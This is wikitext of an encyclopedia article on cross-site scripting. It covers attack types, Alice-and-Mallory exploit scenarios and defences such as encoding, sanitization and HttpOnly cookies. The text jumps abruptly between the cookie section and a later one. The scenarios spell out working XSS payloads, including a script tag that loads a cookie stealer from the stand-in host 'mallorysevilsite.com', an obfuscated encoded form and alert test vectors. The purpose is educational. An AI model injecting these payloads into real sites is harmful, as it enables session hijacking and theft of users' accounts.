|url=http://www.bindshell.net/papers/xssv |publisher=BindShell.net |accessdate=May 27, 2008 |archive-url=https://web.archive.org/web/20080516055612/http://www.bindshell.net/papers/xssv/ |archive-date=May 16, 2008 |url-status=dead |df=mdy-all }} and {{cite web |last=Grossman |first=Jeremiah |title=Cross-Site Scripting Worms and Viruses: The Impending Threat and the Best Defense |url=http://www.net-security.org/dl/articles/WHXSSThreats.pdf |date=April 2006 |publisher=WhiteHat Security |page=20 |accessdate=June 6, 2008 }}{{Dead link|date=August 2018 |bot=InternetArchiveBot |fix-attempted=yes }}</ref>\n\nThe methods of injection can vary a great deal; in some cases, the attacker may not even need to directly interact with the web functionality itself to exploit such a hole. Any data received by the web application (via email, system logs, IM etc.) that can be controlled by an attacker could become an injection vector.\n\n===Server-side versus DOM-based vulnerabilities===\n{{Quote box\n|width=30%\n|title=Example of a DOM-based XSS flaw\n|Before the bug was resolved, Bugzilla error pages were open to [[Document Object Model|DOM]]-based XSS attacks in which arbitrary HTML and scripts could be injected using forced error messages.<ref>{{cite web |title=Bug 272620 \u2013 XSS vulnerability in internal error messages |url=https://bugzilla.mozilla.org/show_bug.cgi?id=272620 |year=2004 |publisher=Bugzilla@Mozilla |accessdate=May 29, 2008}}</ref>\n}}\nHistorically XSS vulnerabilities were first found in applications that performed all data processing on the server side. User input (including an XSS vector) would be sent to the server, and then sent back to the user as a web page. The need for an improved user experience resulted in popularity of applications that had a majority of the presentation logic (maybe written in [[JavaScript]]) working on the client-side that pulled data, on-demand, from the server using [[AJAX]].\n\nAs the JavaScript code was also processing user input and rendering it in the web page content, a new sub-class of reflected XSS attacks started to appear that was called ''[[Document Object Model|DOM]]-based cross-site scripting''. In a DOM-based XSS attack, the malicious data does not touch the web server. Rather, it is being reflected by the JavaScript code, fully on the client side.<ref>{{cite web |url=https://www.owasp.org/index.php/DOM_Based_XSS |title=DOM based XSS |publisher=OWASP}}</ref>\n\nAn example of a DOM-based XSS vulnerability is the bug found in 2011 in a number of [[jQuery]] plugins.<ref>{{cite web |url=http://bugs.jquery.com/ticket/9521 |title=JQuery bug #9521 |year=2011}}</ref> Prevention strategies for DOM-based XSS attacks include very similar measures to traditional XSS prevention strategies but implemented in [[JavaScript]] code and contained in web pages (i.e. input validation and escaping).<ref>{{cite web |url=https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet |title=DOM based XSS prevention cheat sheet |publisher=OWASP}}</ref> Some [[JavaScript library|JavaScript frameworks]] have built-in countermeasures against this and other types of attack &mdash; for example [[Angular.js]].<ref>{{cite web |url=http://docs.angularjs.org/api/ng.$sce |title=Strict Contextual Escaping |publisher=Angular.js}}</ref>\n\n===Self-XSS===\n\n[[Self-XSS]] is a form of XSS vulnerability which relies on Social Engineering in order to trick the victim into executing malicious JavaScript code into their browser. Although it is technically not a true XSS vulnerability due to the fact it relies on socially engineering a user into executing code rather than a flaw in the affected website allowing an attacker to do so, it still poses the same risks as a regular XSS vulnerability if properly executed.<ref>{{cite web |title= Self-XSS Facebook scam attempts to trick users into hacking themselves |work= www.majorgeeks.com |date= 2014-07-29 |url= http://www.majorgeeks.com/news/story/self_xss_facebook_scam_attempts_to_trick_users_into_hacking_themselves.html |access-date= 2016-09-20 }}</ref>\n\n===Mutated XSS (mXSS) ===\nMutated XSS happens when the attacker injects something that is seemingly safe, but rewritten and modified by the browser, while parsing the markup. This makes it extremely hard to detect or sanitize within the websites application logic.\nAn example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters on parameters to CSS font-family.\n\n=={{anchor|Exploit scenarios}}Exploit examples==\n\nAttackers intending to exploit cross-site scripting vulnerabilities must approach each class of vulnerability differently. For each class, a specific attack vector is described here. The names below are technical terms, taken from the [[Alice and Bob|Alice-and-Bob cast of characters]] commonly used in computer security.\n\nThe [[BeEF (Browser Exploitation Framework)|Browser Exploitation Framework]] could be used to attack the web site and the user's local environment.\n\n===Non-persistent===\n# Alice often visits a particular website, which is hosted by Bob. Bob's website allows Alice to log in with a username/password pair and stores sensitive data, such as billing information. When a user logs in, the browser keeps an Authorization Cookie, which looks like some garbage characters, so both computers (client and server) have a record that she's logged in.\n# Mallory observes that Bob's website contains a reflected XSS vulnerability:\n## When she visits the Search page, she inputs a search term in the search box and clicks the submit button. If no results were found, the page will display the term she searched for followed by the words \"not found,\" and the url will be <code><nowiki>http://bobssite.org/search?q=her</nowiki>%20search%20term</code>.\n## With a normal search query, like the word \"'''puppies'''\", the page simply displays \"'''puppies''' not found\" and the url is \"<nowiki>http://bobssite.org/search</nowiki>'''?q=puppies'''\" - which is perfectly normal behavior.\n## However, when she submits an abnormal search query, like \"{{code|2=html4strict|1=<script type='application/javascript'>alert('xss');</script>}}\",\n### An alert box appears (that says \"xss\").\n### The page displays \" not found,\" along with an error message with the text 'xss'.\n### The url is \"<code><nowiki>http://bobssite.org/search</nowiki>'''?q=<script%20type='application/javascript'>alert('xss');</script>'''</code> - which is exploitable behavior.\n# Mallory crafts a URL to exploit the vulnerability:\n## She makes the URL <code><nowiki>http://bobssite.org/search</nowiki>'''?q=puppies&lt;script%20src=\"<nowiki>http://mallorysevilsite.com/authstealer.js\"></script></nowiki>'''</code>. She could choose to encode the [[ASCII]] characters with [[percent-encoding]], such as <code><nowiki>http://bobssite.org/search</nowiki>'''?q=puppies<nowiki>%3Cscript%2520src%3D%22http%3A%2F%2Fmallorysevilsite.com%2Fauthstealer.js%22%3E%3C%2Fscript%3E</nowiki>'''</code>, so that human readers cannot immediately decipher the malicious URL.<ref name=geekstuff>{{cite web |url=http://www.thegeekstuff.com/2012/02/xss-attack-examples/ |title=XSS Attack Examples (Cross-Site Scripting Attacks) |author=Lakshmanan Ganapathy |date=February 16, 2012 |website=www.thegeekstuff.com}}</ref>\n## She sends an e-mail to some unsuspecting members of Bob's site, saying \"Check out some cute puppies!\"\n# Alice gets the e-mail. She loves puppies and clicks on the link. It goes to Bob's website to search, doesn't find anything, and displays \"puppies not found\" but right in the middle, the script tag runs (it is invisible on the screen) and loads and runs Mallory's program authstealer.js (triggering the XSS attack). Alice forgets about it.\n# The authstealer.js program runs in Alice's browser, as if it originated from Bob's website. It grabs a copy of Alice's Authorization Cookie and sends it to Mallory's server, where Mallory retrieves it.\n# Mallory now puts Alice's Authorization Cookie into her browser as if it were her own. She then goes to Bob's site and is now logged in as Alice.\n# Now that she's in, Mallory goes to the Billing section of the website and looks up Alice's [[Payment card number|credit card number]] and grabs a copy. Then she goes and changes her password so Alice can't log in anymore.\n# She decides to take it a step further and sends a similarly crafted link to Bob himself, thus gaining administrator privileges to Bob's website.\n\nSeveral things could have been done to mitigate this attack:\n# The search input could have been [[HTML sanitization|sanitized]] which would include proper encoding checking.\n# The web server could be set to [[Server-side redirect|redirect]] invalid requests.\n# The web server could detect a simultaneous login and invalidate the sessions.\n# The web server could detect a simultaneous login from two different IP addresses and invalidate the sessions.\n# The website could display only the last few digits of a previously used credit card.\n# The website could require users to enter their passwords again before changing their registration information.\n# The website could enact various aspects of the [[Content Security Policy]].\n# Set cookie with <code>HttpOnly</code> flag to prevent access from JavaScript.\n\n===Persistent attack===\n# Mallory gets an account on Bob's website.\n# Mallory observes that Bob's website contains a stored XSS vulnerability. If you go to the News section, and post a comment, it will display whatever he types in for the comment. But, if the comment text contains HTML tags in it, the tags will be displayed as it is, and any script tags get run.\n# Mallory reads an article in the News section and writes in a comment at the bottom in the Comments section. In the comment, she inserts this text: <code>I love the puppies in this story! They're so cute!'''&lt;script src=\"<nowiki>http://mallorysevilsite.com/authstealer.js</nowiki>\"&gt;'''</code>\n# When Alice (or anyone else) loads the page with the comment, Mallory's script tag runs and steals Alice's authorization cookie, sending it to Mallory's secret server for collection.<ref name=geekstuff/>\n# Mallory can now [[session hijacking|hijack]] Alice's session and impersonate Alice.<ref>{{cite news |last=Brodkin |first=Jon |title=The top 10 reasons Web sites get hacked |url=http://www.networkworld.com/article/2286560/lan-wan/the-top-10-reasons-web-sites-get-hacked.html |date=October 4, 2007 |work=Network World |publisher=IDG |accessdate=February 6, 2017 }}</ref><ref name=geekstuff/>\n\nBob's website software should have stripped out the script tag or done something to make sure it didn't work, but the security bug is in the fact that he didn't.\n\n=={{anchor|Mitigation|Reducing the threat}}Preventive measures==\n{{manual|section|date=December 2014}}\n\n===Contextual output encoding/escaping of string input===\n\nContextual output encoding/escaping could be used as the primary defense mechanism to stop XSS attacks. There are several escaping schemes that can be used depending on where the untrusted string needs to be placed within an HTML document including HTML entity encoding, JavaScript escaping, CSS escaping, and [[Percent-encoding|URL (or percent) encoding]].<ref name=\"OWASP\">{{cite web |last=Williams |first=Jeff |title=XSS (Cross Site Scripting) Prevention Cheat Sheet |url=https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet |publisher=OWASP |date=January 19, 2009 |accessdate=February 4, 2010 }}</ref> Most web applications that do not need to accept rich data can use escaping to largely eliminate the risk of XSS attacks in a fairly straightforward manner.\n\nAlthough widely recommended, performing HTML entity encoding only on the [[List of XML and HTML character entity references#Predefined entities in XML|five XML significant characters]] is not always sufficient to prevent many forms of XSS attacks. As encoding is often difficult, security encoding libraries are usually easier to use.<ref name=\"OWASP\" />\n\nSome [[web template system]]s understand the structure of the HTML they produces and automatically pick an appropriate encoder.<ref>{{Cite web|url=https://golang.org/pkg/html/template/#hdr-Introduction|title=template - The Go Programming Language|website=golang.org|access-date=2019-05-01}}</ref><ref>{{Cite web|url=https://developers.google.com/closure/templates/docs/security|title=Google Developers|website=Google Developers|language=en|access-date=2019-05-01}}</ref><ref>{{Cite web|url=https://www.npmjs.com/package/pug-plugin-trusted-types|title=pug-plugin-trusted-types|website=npm|access-date=2019-05-01}}</ref>\n\n===Safely validating untrusted HTML input ===\n\nMany operators of particular web applications (e.g. forums and webmail) allow users to utilize a limited subset of HTML markup. When accepting HTML input from users (say, <tt>&lt;b&gt;very&lt;/b&gt; large</tt>), output encoding (such as <tt>&amp;lt;b&amp;gt;very&amp;lt;/b&amp;gt; large</tt>) will not suffice since the user input needs to be rendered as HTML by the browser (so it shows as \"'''very''' large\", instead of \"&lt;b&gt;very&lt;/b&gt; large\"). Stopping an XSS attack when accepting HTML input from users is much more complex in this situation. Untrusted HTML input must be run through an [[HTML sanitization]] engine to ensure that it does not contain XSS code.\n\nMany validations rely on parsing out (blacklisting) specific \"at risk\" HTML tags such as the following<syntaxhighlight lang=\"html5\">\n<script> <link> <iframe>\n</syntaxhighlight>\n\nThere are several issues with this approach, for example sometimes seemingly harmless tags can be left out which when utilized correctly can still result in an XSS\n\n(see the below example) <syntaxhighlight lang=\"html5\">\n<img src=\"javascript:alert(1)\">\n</syntaxhighlight>Another popular method is to strip user input of \" and ' however this can also be bypassed as the payload can be concealed with [[Obfuscation]] (See this [http://www.jsfuck.com/] link for an extreme example of this)\n\n===Cookie security===\nBesides content filtering, other imperfect methods for cross-site scripting mitigation are also commonly used. One example is the use of additional security controls when handling [[HTTP cookie|cookie]]-based user authentication. Many web applications rely on session cookies for authentication between individual HTTP requests, and because client-side scripts generally have access to these cookies, simple XSS exploits can steal these cookies.<ref name=\"Sharma\">{{cite web |last=Sharma |first=Anand |title=Prevent a cross-site scripting attack |url=http://www.ibm.com/developerworks/ibm/library/wa-secxss/ |publisher=IBM |date=February 3, 2004 |accessdate=May 29, 2008 }}</ref> To mitigate this particular threat (though not the XSS problem in general), many web applications tie session cookies to the IP address of the user who originally logged in, then only permit that IP to use that cookie.<ref name=\"ModSecurity\">{{cite web |title=ModSecurity: Features: PDF Universal XSS Protection |url=http://www.modsecurity.org/projects/modsecurity/apache/feature_universal_pdf_xss.html |archive-url=https://web.archive.org/web/20080323040609/http://www.modsecurity.org/projects/modsecurity/apache/feature_universal_pdf_xss.html |url-status=dead |archive-date=March 23, 2008 |publisher=Breach Security |accessdate=June 6, 2008 }}</ref> This is effective in most situations (if an attacker is only after the cookie), but obviously breaks down in situations where an attacker is behind the same [[Network address translation|NAT]]ed IP address or [[web proxy]] as the victim, or the victim is changing his or her [[mobile IP]].<ref name=\"ModSecurity\" />\n\nAnother mitigation present in [[Internet Explorer]] (since version 6), [[Firefox]] (since version 2.0.0.5), [[Safari (web browser)|Safari]] (since version 4), [[Opera (web browser)|Opera]] (since version 9.5) and [[Google Chrome]], is an ''HttpOnly'' flag which allows a web server to set a cookie that is unavailable to client-side scripts.

You can select vectors by the event, tag or browser and a proof of concept is included for every vector.\n\n==Related vulnerabilities==\nIn a '''Universal Cross-Site Scripting''' ('''UXSS''', or '''Universal XSS''') attack, vulnerabilities in the browser itself or in the browser plugins are exploited (rather than vulnerabilities in other websites, as is the case with XSS attacks).<ref>{{cite web |first=Stefano |last=Di Paola |title=Adobe Acrobat Reader Plugin - Multiple Vulnerabilities |url=http://www.wisec.it/vulns.php?page=9 |date=January 3, 2007 |publisher=Wisec.it |accessdate=March 13, 2012 }}</ref><ref>{{cite web |first=Roberto |last=Suggi Liverani |title=UXSS in McAfee Endpoint Security, www.mcafee.com and some extra goodies... |url=http://blog.malerisch.net/2017/04/uxss-mcafee-endpoint-security-and-site-advisor-cve-2016-8011.html |date=April 26, 2017 |publisher=blog.malerisch.net |accessdate=May 3, 2017 }}</ref>\n\nSeveral classes of vulnerabilities or attack techniques are related to XSS: [[cross-zone scripting]] exploits \"zone\" concepts in certain browsers and usually executes code with a greater privilege.<ref>{{cite news |title=Security hole in Internet Explorer allows attackers to execute arbitrary programs |url=http://www.h-online.com/security/news/item/Security-hole-in-Internet-Explorer-allows-attackers-to-execute-arbitrary-programs-735225.html |date=May 16, 2008 |publisher=Heise Media UK |accessdate=June 7, 2008 }}</ref><ref>{{cite web |first=Roberto |last=Suggi Liverani|title=Cross Context Scripting in Firefox |url=http://www.security-assessment.com/files/whitepapers/Cross_Context_Scripting_with_Firefox.pdf |date=April 21, 2010 |publisher=Security-Assessment.com |accessdate=May 3, 2017 }}</ref> [[HTTP header injection]] can be used to create cross-site scripting conditions due to escaping problems on HTTP protocol level (in addition to enabling attacks such as [[HTTP response splitting]]).<ref>{{cite web |title=Update available for potential HTTP header injection vulnerabilities in Adobe Flash Player |url=http://www.adobe.com/support/security/bulletins/apsb06-18.html |date=November 14, 2006 |publisher=Adobe Systems |accessdate=June 7, 2008 }}</ref>\n\n[[Cross-site request forgery]] (CSRF/XSRF) is almost the opposite of XSS, in that rather than exploiting the user's trust in a site, the attacker (and his malicious page) exploits the site's trust in the client software, submitting requests that the site believes represent conscious and intentional actions of authenticated users.<ref>{{cite web |last=Auger |first=Robert |title=The Cross-Site Request Forgery (CSRF/XSRF) FAQ (version 1.59) |url=http://www.cgisecurity.com/articles/csrf-faq.shtml |date=April 17, 2008 |publisher=Cgisecurity.com |accessdate=June 7, 2008 }}</ref> XSS vulnerabilities (even in other applications running on the same domain) allow attackers to bypass CSRF prevention efforts.<ref>{{cite web|url=http://www.webappsecblog.com/CsrfAndSameOriginXss.html|title=CSRF and same-origin XSS|first=Christian|last=Schneider|website=www.webappsecblog.com}}</ref>\n\n[[Phishing#Covert redirect|Covert Redirection]] takes advantage of third-party clients susceptible to XSS or Open Redirect attacks.<ref name=\"Covert_Redirect\">{{cite web |url=https://news.ycombinator.com/item?id=7685677 |title=OAuth 2.0 and OpenID Redirect Vulnerability |publisher=Hacker News |date=May 2, 2014 |accessdate=December 21, 2014 }}</ref> Normal phishing attempts can be easy to spot, because the malicious page's URL will usually be off by a couple of letters from that of the real site.
